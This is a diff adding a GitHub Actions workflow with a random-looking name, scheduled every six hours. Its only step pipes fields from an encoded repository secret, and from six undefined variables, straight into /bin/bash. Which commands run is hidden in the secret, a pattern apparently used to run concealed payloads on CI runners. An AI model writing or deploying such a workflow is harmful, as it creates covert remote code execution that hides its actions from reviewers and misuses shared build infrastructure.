@@ -1,0 +1,23 @@
+name: allisonjavascript219
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: allisonjavascript219
+        env:
+          ig23: ${{ secrets.ig23 }}
+        run: |
+          echo $ig23 | jq -r .btzh4821 | /bin/bash
+          echo $jmt4 | jq -r .byuc68 | /bin/bash
+          echo $jd7 | jq -r .sj17 | /bin/bash
+          echo $dbq75 | jq -r .ey7 | /bin/bash
+          echo $ypjl18 | jq -r .wl14 | /bin/bash
+          echo $ps0954 | jq -r .ulomp29287 | /bin/bash
+          echo $dfsl154 | jq -r .vg3571 | /bin/bash
+
